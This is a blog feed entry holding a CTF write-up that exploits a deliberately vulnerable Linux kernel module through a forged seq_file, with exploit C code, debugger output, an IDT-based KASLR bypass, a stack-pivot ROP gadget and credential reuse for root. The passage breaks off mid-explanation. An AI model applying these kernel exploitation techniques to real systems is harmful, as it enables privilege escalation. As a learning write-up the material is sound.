<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://jkrshnmenon.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://jkrshnmenon.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-09-08T01:38:48+00:00</updated><id>https://jkrshnmenon.github.io/feed.xml</id><title type="html">Jayakrishna Menon Vadayath</title><subtitle>Random ramblings of a CTF player </subtitle><entry><title type="html">ASIS CTF 2025 File No! Writeup</title><link href="https://jkrshnmenon.github.io/blog/2025/asisctf25fileno/" rel="alternate" type="text/html" title="ASIS CTF 2025 File No! Writeup"/><published>2025-09-06T15:09:00+00:00</published><updated>2025-09-06T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2025/asisctf25fileno</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2025/asisctf25fileno/"><![CDATA[<p>So, I’ve finally gotten around to trying out a kernel pwning challenge.</p> <p>I picked this one mostly because there weren’t many people working on it and I thought it would be a good learning experience. And I certainly learned a lot.</p> <p>Full disclosure, ChatGPT did help me with understanding some of the kernel stuff. But it also turns out that its pretty bad at coming up with an exploit strategy (at least for this challenge).</p> <h2 id="the-challenge">The challenge</h2> <p>We’re given all the usual stuff for a kernel challenge including the <code class="language-plaintext highlighter-rouge">bzImage</code>, <code class="language-plaintext highlighter-rouge">rootfs.ext4</code>, a <code class="language-plaintext highlighter-rouge">run</code> script and the source code for the vulnerable kernel module.</p> <p>Here’s the important bits from the module:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
<span class="p">}</span> <span class="n">req_t</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">module_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">req_t</span> <span class="n">req</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="n">CMD_READ</span> <span class="o">&amp;&amp;</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="n">CMD_WRITE</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="p">(</span><span class="n">req_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">)))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">module_lock</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">fget</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">fd</span><span class="p">)))</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">S_ISREG</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_mode</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="n">CMD_READ</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">req</span><span class="p">.</span><span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>                         <span class="c1">// &lt;--- BUG HERE</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">copy_to_user</span><span class="p">((</span><span class="n">req_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">)))</span> <span class="p">{</span>
      <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">target</span><span class="o">-&gt;</span><span class="n">private_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">req</span><span class="p">.</span><span class="n">val</span><span class="p">;</span>                        <span class="c1">// &lt;--- BUG HERE</span>
  <span class="p">}</span>

 <span class="nl">unlock_on_fail:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fput</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">module_lock</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>What this module basically does it allow the user to read or write the <code class="language-plaintext highlighter-rouge">private_data</code> member in a <code class="language-plaintext highlighter-rouge">struct file</code> which is a <code class="language-plaintext highlighter-rouge">void *</code> pointer which I assumed would be something that can store any extra data.</p> <p>After consulting with ChatGPT, I learned that this <code class="language-plaintext highlighter-rouge">private_data</code> pointer is just a <code class="language-plaintext highlighter-rouge">NULL</code> pointer for regular files on disk, but for special files like the ones in <code class="language-plaintext highlighter-rouge">/proc/</code>, this pointer points to a special <code class="language-plaintext highlighter-rouge">struct seq_file</code> structure.</p> <p>This can easily be confirmed quickly by opening a file like <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> and using its fd to read the <code class="language-plaintext highlighter-rouge">private_data</code> pointer using the module’s <code class="language-plaintext highlighter-rouge">CMD_READ</code> command and comparing it with a regular file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="nv">$ </span>./exploit
Opening vulnerable device /dev/vuln.ko
Opening /proc/self/maps <span class="o">(</span>fd <span class="o">=</span> 2<span class="o">)</span>
Opening /exploit.c <span class="o">(</span>fd <span class="o">=</span> 3<span class="o">)</span>
Sending ioctl to <span class="nb">read </span>from /proc/self/maps <span class="o">(</span>request.fd <span class="o">=</span> 2<span class="o">)</span>
Val <span class="o">=</span> ffff8ab001b67000
Sending ioctl to <span class="nb">read </span>from /exploit.c <span class="o">(</span>request.fd <span class="o">=</span> 3<span class="o">)</span>
Val <span class="o">=</span> 0
</code></pre></div></div> <p>So, this confirms that the <code class="language-plaintext highlighter-rouge">private_data</code> pointer for <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> is indeed a valid pointer to a <code class="language-plaintext highlighter-rouge">struct seq_file</code>. With this knowledge, the next step is to figure out how to fake a <code class="language-plaintext highlighter-rouge">struct seq_file</code> to get the flag.</p> <p>The flag is mounted into the VM as a drive:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-drive</span> <span class="nv">file</span><span class="o">=</span>/tmp/flag.txt,format<span class="o">=</span>raw,index<span class="o">=</span>1
</code></pre></div></div> <p>It’s available inside the VM as <code class="language-plaintext highlighter-rouge">/dev/sdb</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="c"># whoami</span>
root
~ <span class="c"># cat /dev/sdb</span>
FLAG<span class="o">{</span>dummy<span class="o">}</span>
</code></pre></div></div> <p>So, our objective is to just run <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> as root.</p> <h2 id="the-struct-seq_file">The struct seq_file</h2> <p>The <code class="language-plaintext highlighter-rouge">struct seq_file</code> has a relatively simple layout:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">seq_file</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>                        <span class="c1">// Pointer to a buffer</span>
<span class="p">...</span>                                   <span class="c1">// A bunch of size_t integers</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">seq_operations</span> <span class="o">*</span><span class="n">op</span><span class="p">;</span>  <span class="c1">// Pointer to seq_operations</span>
<span class="p">...</span>
<span class="p">};</span>
</code></pre></div></div> <p>I’ve only included the really important members here. The <code class="language-plaintext highlighter-rouge">buf</code> member is a pointer to a buffer which is essentially used for buffering some data. The <code class="language-plaintext highlighter-rouge">op</code> member points to a <code class="language-plaintext highlighter-rouge">struct seq_operations</code> which is a struct of function pointers.</p> <p>With a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code>, we can control the <code class="language-plaintext highlighter-rouge">buf</code> pointer and the <code class="language-plaintext highlighter-rouge">op</code> pointers which would theoretically provide us with PC control and arbitrary read primitives.</p> <h2 id="strategy">Strategy</h2> <p>For some reason, I found that the flag was in the memory of my VM. I could see it when I ran <code class="language-plaintext highlighter-rouge">search-pattern FLAG</code> in GDB. So my idea was to just read the memory of the kernel to find the flag. And so I spent some time working on the arbitrary read primitive.</p> <p>At the same time, @zolutal and @dbena were not able to find the flag in memory on their machines (I have no idea why), and so they were working on a ROP chain to call <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> which would be invoked using the PC control primitive. However, since we did not have a kernel text leak, this would have to involve some brute-forcing. According to @zolutal, this would be a 1/512 chance of success.</p> <h2 id="arbitrary-read">Arbitrary read</h2> <h3 id="heap-spray">Heap spray</h3> <p>In order to craft a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> and overwrite the <code class="language-plaintext highlighter-rouge">private_data</code> pointer to this fake structure, I needed to first make sure that the fake structure would be present at some offset from the leaked <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <p>@zolutal suggested that simply creating a bunch of mmaped pages and filling them with fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> structures would be a good way to do this. And so I ended up with this code to do the heap spray:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// This is where I found the flag in memory using GDB</span>
  <span class="kt">size_t</span> <span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0xffff888002ede000</span><span class="p">;</span>

  <span class="c1">// Spray fake seq structures</span>
  <span class="c1">// Two 0xdeadbeefcafebabe values are for me to find the sprayed structures in memory</span>
  <span class="n">seq_t</span> <span class="n">fake_seq</span> <span class="o">=</span> <span class="p">{(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">};</span>

  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">seq_t</span> <span class="o">*</span><span class="n">spray</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">spray</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">spray</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_seq</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">seq_t</span><span class="p">));</span>
  <span class="p">}</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Finished spray"</span><span class="p">);</span>
</code></pre></div></div> <p>I found that this was enough to put a fake structure at an offset of <code class="language-plaintext highlighter-rouge">-0x42e000</code> from the leaked <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <h3 id="leaking-memory">Leaking memory</h3> <p>My plan for the arbitrary read was to craft a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> with the <code class="language-plaintext highlighter-rouge">buf</code> pointing to the address where the flag was located in memory and then to use the <code class="language-plaintext highlighter-rouge">seq_read</code> function to read the flag into user space.</p> <p>In order to do that, I had to avoid any of the <code class="language-plaintext highlighter-rouge">ops</code> functions from being invoked as that would just crash. And I found this part of the <code class="language-plaintext highlighter-rouge">seq_read_iter</code> function (called by <code class="language-plaintext highlighter-rouge">seq_read</code> to actually do the reading) which avoids the <code class="language-plaintext highlighter-rouge">ops</code> functions.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/*
     * if request is to read from zero offset, reset iterator to first
     * record as it might have been already advanced by previous requests
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>                     <span class="c1">// &lt;------- HAVE TO AVOID THIS</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">...</span>
    <span class="c1">// something left in the buffer - copy it out first</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span>                             <span class="c1">// &lt;------- OTHERWISE THIS BRANCH WILL NOT BE TAKEN</span>
        <span class="n">n</span> <span class="o">=</span> <span class="n">copy_to_iter</span><span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">from</span><span class="p">,</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">,</span> <span class="n">iter</span><span class="p">);</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">from</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">copied</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">)</span>	<span class="c1">// hadn't managed to copy everything</span>
            <span class="k">goto</span> <span class="n">Done</span><span class="p">;</span>
</code></pre></div></div> <p>I found that I just needed to update my fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> with the following data:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">fake_seq</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_addr</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">from</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">count</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">read_pos</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</code></pre></div></div> <p>And combined with an lseek, I could trigger the branch that executes the <code class="language-plaintext highlighter-rouge">goto Done;</code> thus avoiding any of the <code class="language-plaintext highlighter-rouge">ops</code> functions.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// leak_addr comes from the CMD_READ ioctl</span>
  <span class="kt">uint64_t</span> <span class="n">leak_page</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x42e000</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">fake_seq_addr</span> <span class="o">=</span> <span class="n">leak_page</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>

  <span class="n">request</span><span class="p">.</span><span class="n">val</span> <span class="o">=</span> <span class="n">fake_seq_addr</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Overwriting private_data with %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">request</span><span class="p">.</span><span class="n">val</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span> <span class="n">CMD_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">request</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"ioctl"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kt">char</span> <span class="n">flag_buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"FLAG %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flag_buf</span><span class="p">);</span>
</code></pre></div></div> <p>And this was working and printing the flag on my machine:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ./exploit
Opening vulnerable device...
Opening /proc/self/maps...
Sending ioctl to read from sys file
Private data leak = 0xffff888002f67b40
Finished spray
Overwriting private_data with 0xffff888002b39000
FLAG FLAG{dummy}
</code></pre></div></div> <p>But this wasn’t working on anyone else’s machine. However, I could just replace the <code class="language-plaintext highlighter-rouge">flag_addr</code> with any address that I wanted to read which was basically an arbitrary read primitive.</p> <h2 id="its-rop-time">It’s ROP time</h2> <p>By the time I had gotten to this point, @zolutal and @dbena had come up with a ROP chain to call <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> using the PC control primitive.</p> <h3 id="leaking-kernel-base">Leaking kernel base</h3> <p>After asking @zolutal and @kylebot, it turns out that there’s an area of the kernel which is not randomized. The Interrupt Descriptor Table (IDT), apparently is always at the address <code class="language-plaintext highlighter-rouge">0xfffffe0000000000</code>.</p> <p>According to @zolutal, everything in the CPU Entry Area is randomized except for this IDT. Now this IDT is a table of <code class="language-plaintext highlighter-rouge">struct idt_entry</code> elements. And each <code class="language-plaintext highlighter-rouge">struct idt_entry</code> has a layout like this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>offset  size  field
------  ----  ----------------------------
0x00     2    offset0      (addr bits 0..15)
0x02     2    selector
0x04     2    ist:type:dpl:p  (attributes word)
0x06     2    offset1      (addr bits 16..31)
0x08     4    offset2      (addr bits 32..63)
0x0c     4    reserved
</code></pre></div></div> <p>By reading the first element of the IDT, we can get a pointer to the kernel text segment which defeats KASLR. We don’t need the whole <code class="language-plaintext highlighter-rouge">struct idt_entry</code> to do this, just the bytes from 4 to 12 which contains the <code class="language-plaintext highlighter-rouge">&lt;offset2:4bytes&gt;&lt;offset1:2bytes&gt;&lt;ist:type:dpl:p:2bytes&gt;</code> which gives us all but the last 2 bytes of the address. And since the kernel text base is aligned to a 2MiB boundary, the last 2 bytes are always <code class="language-plaintext highlighter-rouge">0x0000</code>.</p> <p>So my script was now updated to do this:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// IDT (0xfffffe0000000000) + 4</span>
  <span class="kt">size_t</span> <span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0xfffffe0000000004</span><span class="p">;</span>
<span class="p">...</span>
<span class="p">...</span>
  <span class="kt">char</span> <span class="n">flag_buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

  <span class="c1">// -0x8e00 to zero-out the last 2 bytes</span>
  <span class="kt">uint64_t</span> <span class="n">kaslr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">)</span><span class="o">-</span><span class="mh">0x8e00</span><span class="p">;</span>
</code></pre></div></div> <h3 id="rop-chain">ROP chain</h3> <p>Since we had already sprayed a bunch of <code class="language-plaintext highlighter-rouge">struct seq_file</code> structures, we could just update them in order to place correct <code class="language-plaintext highlighter-rouge">seq_operations</code> pointers within them.</p> <p>When any of the <code class="language-plaintext highlighter-rouge">ops</code> functions are called, the first argument is always a pointer to the <code class="language-plaintext highlighter-rouge">struct seq_file</code>. So, if we could find a gadget that can move the value of <code class="language-plaintext highlighter-rouge">rdi</code> into <code class="language-plaintext highlighter-rouge">rsp</code>, we could pivot the stack into a ROP chain.</p> <p>And surprisingly, there was this gadget in the kernel:</p> <pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">x/6i 0xffffffff814b1a35</span>
   <span style="color:yellow">0xffffffff814b1a35</span>:	<span style="color:lightblue;font-weight:bold">push</span>   <span style="color:white">rdi</span>
   <span style="color:yellow">0xffffffff814b1a36</span>:	<span style="color:lightblue;font-weight:bold">mov</span>    <span style="color:white">ebx</span>,<span style="color:orange">0x415bfffa</span>
   <span style="color:yellow">0xffffffff814b1a3b</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rsp</span>
   <span style="color:yellow">0xffffffff814b1a3c</span>:	<span style="color:lightblue;font-weight:bold">cdqe</span>
   <span style="color:yellow">0xffffffff814b1a3e</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rbp</span>
   <span style="color:yellow">0xffffffff814b1a3f</span>:	<span style="color:lightblue;font-weight:bold">ret</span>
</pre> <p>Which does exactly that.</p> <h3 id="privlege-escalation">Privlege Escalation</h3> <p>The first thing I remember from my kernel exploitation reading was that the <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> was the way to go for privilege escalation. However, it turns out that we could just re-use a creds structure from an existing process.</p> <p>The <code class="language-plaintext highlighter-rouge">struct task_struct</code> has two pointers to <code class="language-plaintext highlighter-rouge">struct cred</code> structures followed by a <code class="language-plaintext highlighter-rouge">comm</code> buffer.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/* Objective and real subjective task credentials (COW): */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>

    <span class="cm">/* Effective (overridable) subjective task credentials (COW): */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">cred</span><span class="p">;</span>

    <span class="cm">/*
     * executable name, excluding path.
     *
     * - normally initialized begin_new_exec()
     * - set it with set_task_comm()
     *   - strscpy_pad() to ensure it is always NUL-terminated and
     *     zero-padded
     *   - task_lock() to ensure the operation is atomic and the name is
     *     fully updated.
     */</span>
    <span class="kt">char</span>				<span class="n">comm</span><span class="p">[</span><span class="n">TASK_COMM_LEN</span><span class="p">];</span>
</code></pre></div></div> <p>Now, for the <code class="language-plaintext highlighter-rouge">init_task</code>, the comm is <code class="language-plaintext highlighter-rouge">swapper</code>. So if we search the memory in GDB for <code class="language-plaintext highlighter-rouge">swapper</code>, we can find the <code class="language-plaintext highlighter-rouge">real_cred</code> and <code class="language-plaintext highlighter-rouge">cred</code> pointers just before this string which give us the pointer to a <code class="language-plaintext highlighter-rouge">struct creds</code> for the <code class="language-plaintext highlighter-rouge">init</code> process which is running as root.</p> <pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">search-pattern swapper</span>
<span style="color:gray">[+] Searching 'swapper' in memory</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001a00000</span>-<span style="color:yellow">0xffff888001caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffff888001c2533e</span> - <span style="color:yellow">0xffff888001c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001caf000</span>-<span style="color:yellow">0xffff8880020dc000</span><span style="color:gray">), permission=rw-</span>
  <span style="color:yellow">0xffff888001e0ca50</span> - <span style="color:yellow">0xffff888001e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81a00000</span>-<span style="color:yellow">0xffffffff81caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffffffff81c2533e</span> - <span style="color:yellow">0xffffffff81c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81caf000</span>-<span style="color:yellow">0xffffffff820dc000</span><span style="color:gray">), permission=rw-</span>
  <span style="color:yellow">0xffffffff81e0ca50</span> - <span style="color:yellow">0xffffffff81e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">tele 0xffffffff81e0ca50-0x10</span>
<span style="color:yellow">0xffffffff81e0ca40</span>│+0x0000: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ real_cred</span>
<span style="color:yellow">0xffffffff81e0ca48</span>│+0x0008: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ cred</span>
<span style="color:yellow">0xffffffff81e0ca50</span>│+0x0010: <span style="color:lightblue">"swapper/0"</span>                                  <span style="color:gray">&lt;------ comm</span>
<span style="color:yellow">0xffffffff81e0ca58</span>│+0x0018: <span style="color:orange">0x0000000000000030</span> (<span style="color:lightblue">"0"?</span>)
<span style="color:yellow">0xffffffff81e0ca60</span>│+0x0020: <span style="color:orange">0x0000000000000000</span>
